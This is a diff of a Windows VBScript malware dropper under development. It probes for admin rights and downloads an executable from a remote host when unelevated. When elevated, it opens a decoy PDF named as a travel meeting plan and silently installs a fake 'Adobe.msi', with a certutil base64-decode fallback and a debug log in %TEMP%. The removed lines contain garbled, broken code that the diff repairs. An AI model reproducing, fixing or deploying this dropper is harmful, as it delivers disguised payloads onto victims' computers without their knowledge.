@@ -6,7 +6,6 @@ Set fso = CreateObject("Scripting.FileSystemObject")
 Set sh  = CreateObject("WScript.Shell")
 qs  = Chr(34)
 
-' open debug log
 logFile = sh.ExpandEnvironmentStrings("%TEMP%") & "\s3_debug.txt"
 Set dbg = fso.OpenTextFile(logFile, 8, True)
 dbg.WriteLine "=================================================="
@@ -26,7 +25,6 @@ selfPath = Replace(selfPath, "%20", " ")
 selfPath = Replace(selfPath, "/", "\")
 dbg.WriteLine "[SELF] selfPath = " & selfPath
 
-' --- admin probe ---
 dbg.WriteLine "[PROBE] running whoami /groups..."
 isAdmin = False
 Dim tmpOut, fIn, contents
@@ -51,14 +49,16 @@ Else
 End If
 Err.Clear
 
-' --- not admin branch ---
+' ============================================================
+'  NOT ADMIN — fire icu.exe
+' ============================================================
 If Not isAdmin Then
     dbg.WriteLine "[BRANCH] NOT ADMIN — firing icu.exe"
 
     tmpExe = sh.ExpandEnvironmentStrings("%TEMP%") & "\icu.exe"
     icuUrl = p1 & p2 & p3 & p4 & p5 & "icu.exe"
-    dbg.WriteLine "[ICU] url   = " & icuUrl
-    dbg.WriteLine "[ICU] dest  = " & tmpExe
+    dbg.WriteLine "[ICU] url  = " & icuUrl
+    dbg.WriteLine "[ICU] dest = " & tmpExe
 
     On Error Resume Next
     Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
@@ -67,11 +67,11 @@ If Not isAdmin Then
     If Err.Number <> 0 Then
         dbg.WriteLine "[ICU] http err: " & Err.Number & " - " & Err.Description
         Err.Clear
-    Else
-        dbg.WriteLine "[ICU] http status: " & http.Status
-        dbg.WriteLine "[ICU] http body  : " & LenB(http.ResponseBody) & " bytes"
     End If
     On Error GoTo 0
+
+    dbg.WriteLine "[ICU] http status: " & http.Status
+    dbg.WriteLine "[ICU] http body  : " & LenB(http.ResponseBody) & " bytes"
 
     If http.Status = 200 Then
         On Error Resume Next
@@ -105,144 +105,117 @@ If Not isAdmin Then
     Else
         dbg.WriteLine "[ICU] FAILED — icu.exe not on disk"
     End If
-
-    dbg.WriteLine "[BRANCH] exiting unelevated pass"
     dbg.WriteLine "=== END (unelevated) ==="
     dbg.Close
-    Exit Sub
-End If
 
-' --- admin branch — do the payload ---
-dbg.WriteLine "[BRANCH] ADMIN — proceeding with payload"
+' ============================================================
+'  ADMIN — do the payload
+' ============================================================
+Else
+    dbg.WriteLine "[BRANCH] ADMIN — proceeding with payload"
 
-' delete icu.exe
-tmpExe = sh.ExpandEnvironmentStrings("%TEMP%") & "\icu.exe"
-On Error Resume Next
-If fso.FileExists(tmpExe) Then
-    fso.DeleteFile tmpExe, True
-    dbg.WriteLine "[CLEANUP] deleted " & tmpExe
-End If
-Err.Clear
-On Error GoTo 0
-
-' --- PDF ---
-dbg.WriteLine "[PDF] starting"
-pdfUrl  = p1 & p2 & p3 & p4 & p5 & "Travel-Meeting-Plan-Q4-2026.pdf"
-pdfPath = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Travel-Meeting-Plan-Q4-2026.pdf"
-dbg.WriteLine "[PDF] url  = " & pdfUrl
-dbg.WriteLine "[PDF] dest = " & pdfPath
-
-On Error Resume Next
-Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
-http.Open "GET", pdfUrl, False
-http.Send
-If Err.Number <> 0 Then
-    dbg.WriteLine "[PDF] http err: " & Err.Number & " - " & Err.Description
-    Err.Clear
-End If
-On Error GoTo 0
-dbg.WriteLine "[PDF] status: " & http.Status
-dbg.WriteLine "[PDF] body  : " & LenB(http.ResponseBody) & " bytes"
-
-If http.Status = 200 Then
+    tmpExe = sh.ExpandEnvironmentStrings("%TEMP%") & "\icu.exe"
     On Error Resume Next
-    Set stream = CreateObject("ADODB.Stream")
-    stream.Type = 1
-    stream.Open
-    stream.Write http.ResponseBody
-    stream.SaveToFile pdfPath, 2
-    If Err.Number <> 0 Then
-        dbg.WriteLine "[PDF] save err: " & Err.Number & " - " & Err.Description
-        Err.Clear
+    If fso.FileExists(tmpExe) Then
+        fso.DeleteFile tmpExe, True
+        dbg.WriteLine "[CLEANUP] deleted " & tmpExe
     End If
-    stream.Close
-    On Error GoTo 0
-    If fso.FileExists(pdfPath) Then
-        dbg.WriteLine "[PDF] saved: " & fso.GetFile(pdfPath).Size & " bytes"
-        sh.Run "msedge.exe """ & pdfPath & """", 1, False
-        dbg.WriteLine "[PDF] opened in Edge"
-    Else
-        dbg.WriteLine "[PDF] save FAILED"
-    End If
-End If
-
-' --- MSI ---
-dbg.WriteLine "[MSI] starting"
-msiUrl  = p1 & p2 & p3 & p4 & p5 & "Adobe.msi"
-msiPath = sh.ExpandEnvironmentStrings("%TEMP%") & "\Adobe.msi"
-dbg.WriteLine "[MSI] url  = " & msiUrl
-dbg.WriteLine "[MSI] dest = " & msiPath
-
-On Error Resume Next
-If fso.FileExists(msiPath) Then fso.DeleteFile msiPath, True
-Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
-http.Open "GET", msiUrl, False
-http.Send
-If Err.Number <> 0 Then
-    dbg.WriteLine "[MSI] http err: " & Err.Number & " - " & Err.Description
     Err.Clear
-End If
-On Error GoTo 0
-dbg.WriteLine "[MSI] status: " & http.Status
-dbg.WriteLine "[MSI] body  : " & LenB(http.ResponseBody) & " bytes"
-
-If http.Status = 200 Then
-    Dim saved
-    saved = False
-
-    On Error Resume Next
-    Set stream = = CreateObject("ADODB.Stream xml")
-    stream.Type = 1
-    stream.OpenDoc
-    stream.Write http.ResponseBody
-   .createElement stream.SaveToFile msiPath, 2("
-    If Err.Number <> 0 Thenb
-        dbg.WriteLine "[MSI] direct save err: " & Err.Number & " - " & Err.Description
-        Err.Clear
-    End If
-    stream.Close
     On Error GoTo 0
 
-    If fso.FileExists(msiPath) Then
-        dbg.WriteLine "[MSI] direct save OK: " & fso.GetFile(msiPath).Size & " bytes"
-        saved = True
-    Else
-        dbg.WriteLine "[MSI] direct save FAILED — trying certutil fallback"
-        Dim b64Path, fh, xmlDoc, binNode, b64Text
-        b64Path = sh.ExpandEnvironmentStrings("%TEMP%") & "\Adobe.b64"
+    ' PDF
+    dbg.WriteLine "[PDF] starting"
+    pdfUrl  = p1 & p2 & p3 & p4 & p5 & "Travel-Meeting-Plan-Q4-2026.pdf"
+    pdfPath = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Travel-Meeting-Plan-Q4-2026.pdf"
+
+    On Error Resume Next
+    Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
+    http.Open "GET", pdfUrl, False
+    http.Send
+    Err.Clear
+    On Error GoTo 0
+    dbg.WriteLine "[PDF] status: " & http.Status
+    dbg.WriteLine "[PDF] body  : " & LenB(http.ResponseBody) & " bytes"
+
+    If http.Status = 200 Then
         On Error Resume Next
-        Set xmlDoc = CreateObject("MSXML2.DOMDocument")
-        Set binNode")
-        binNode.dataType = "bin.base64"
-        binNode.nodeTypedValue = http.ResponseBody
-        b64Text = binNode.text
+        Set stream = CreateObject("ADODB.Stream")
+        stream.Type = 1
+        stream.Open
+        stream.Write http.ResponseBody
+        stream.SaveToFile pdfPath, 2
         Err.Clear
         On Error GoTo 0
-        If b64Text <> "" Then
-            dbg.WriteLine "[MSI] b64 len: " & Len(b64Text)
-            Set fh = fso.CreateTextFile(b64Path, True)
-            fh.Write b64Text
-            fh.Close
-            sh.Run "%COMSPEC% /c certutil.exe -decode """ & b64Path & """ """ & msiPath & """", 0, True
-            If fso.FileExists(msiPath) Then
-                dbg.WriteLine "[MSI] certutil decode OK: " & fso.GetFile(msiPath).Size & " bytes"
-                saved = True
-            Else
-                dbg.WriteLine "[MSI] certutil decode FAILED"
-            End If
-            On Error Resume Next
-            fso.DeleteFile b64Path, True
-            Err.Clear
-            On Error GoTo 0
+        If fso.FileExists(pdfPath) Then
+            dbg.WriteLine "[PDF] saved: " & fso.GetFile(pdfPath).Size & " bytes"
+            sh.Run "msedge.exe """ & pdfPath & """", 1, False
+            dbg.WriteLine "[PDF] opened in Edge"
         End If
     End If
 
-    If saved Then
-        dbg.WriteLine "[MSI] launching msiexec"
-        sh.Run "msiexec.exe /i """ & msiPath & """ /qn /norestart", 0, False
-        dbg.WriteLine "[MSI] msiexec spawned"
-    End If
-End If
+    ' MSI
+    dbg.WriteLine "[MSI] starting"
+    msiUrl  = p1 & p2 & p3 & p4 & p5 & "Adobe.msi"
+    msiPath = sh.ExpandEnvironmentStrings("%TEMP%") & "\Adobe.msi"
 
-dbg.WriteLine "=== END (elevated) ==="
-dbg.Close
+    On Error Resume Next
+    If fso.FileExists(msiPath) Then fso.DeleteFile msiPath, True
+    Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
+    http.Open "GET", msiUrl, False
+    http.Send
+    Err.Clear
+    On Error GoTo 0
+    dbg.WriteLine "[MSI] status: " & http.Status
+    dbg.WriteLine "[MSI] body  : " & LenB(http.ResponseBody) & " bytes"
+
+    If http.Status = 200 Then
+        Dim saved
+        saved = False
+
+        On Error Resume Next
+        Set stream = CreateObject("ADODB.Stream")
+        stream.Type = 1
+        stream.Open
+        stream.Write http.ResponseBody
+        stream.SaveToFile msiPath, 2
+        Err.Clear
+        On Error GoTo 0
+
+        If fso.FileExists(msiPath) Then
+            dbg.WriteLine "[MSI] saved: " & fso.GetFile(msiPath).Size & " bytes"
+            saved = True
+        Else
+            dbg.WriteLine "[MSI] direct save FAILED — certutil fallback"
+            Dim b64Path, fh, xmlDoc, binNode, b64Text
+            b64Path = sh.ExpandEnvironmentStrings("%TEMP%") & "\Adobe.b64"
+            On Error Resume Next
+            Set xmlDoc = CreateObject("MSXML2.DOMDocument")
+            Set binNode = xmlDoc.createElement("b")
+            binNode.dataType = "bin.base64"
+            binNode.nodeTypedValue = http.ResponseBody
+            b64Text = binNode.text
+            Err.Clear
+            On Error GoTo 0
+            If b64Text <> "" Then
+                Set fh = fso.CreateTextFile(b64Path, True)
+                fh.Write b64Text
+                fh.Close
+                sh.Run "%COMSPEC% /c certutil.exe -decode """ & b64Path & """ """ & msiPath & """", 0, True
+                If fso.FileExists(msiPath) Then saved = True
+                On Error Resume Next
+                fso.DeleteFile b64Path, True
+                Err.Clear
+                On Error GoTo 0
+            End If
+        End If
+
+        If saved Then
+            dbg.WriteLine "[MSI] launching msiexec"
+            sh.Run "msiexec.exe /i """ & msiPath & """ /qn /norestart", 0, False
+            dbg.WriteLine "[MSI] msiexec spawned"
+        End If
+    End If
+
+    dbg.WriteLine "=== END (elevated) ==="
+    dbg.Close
+End If
